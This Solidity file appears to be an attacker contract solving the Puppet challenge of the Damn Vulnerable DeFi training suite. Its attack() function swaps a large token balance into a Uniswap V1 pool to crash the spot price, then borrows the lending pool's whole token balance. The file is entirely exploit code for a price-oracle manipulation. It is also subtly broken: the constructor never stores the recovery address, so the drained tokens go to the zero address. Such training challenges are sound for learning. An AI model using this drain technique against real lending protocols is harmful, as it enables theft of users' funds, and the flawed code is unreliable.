// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";

contract AttackerV1 {
    address recovery;

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
    uint256 constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 25e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;

    DamnValuableToken token;
    PuppetPool lendingPool;
    IUniswapV1Exchange uniswapV1Exchange;

    constructor(
        PuppetPool _lendingPool,
        IUniswapV1Exchange _uniswapV1Exchange,
        DamnValuableToken _token,
        address _recovery
    ) payable {
        lendingPool = _lendingPool;
        uniswapV1Exchange = _uniswapV1Exchange;
        token = _token;
    }

    function attack() external {
        token.approve(address(uniswapV1Exchange), PLAYER_INITIAL_TOKEN_BALANCE);
        uniswapV1Exchange.tokenToEthSwapInput(
            PLAYER_INITIAL_TOKEN_BALANCE,
            0,
            block.timestamp + 1000
        );
        lendingPool.borrow{value: address(this).balance}(
            token.balanceOf(address(lendingPool)),
            recovery
        );
    }
}
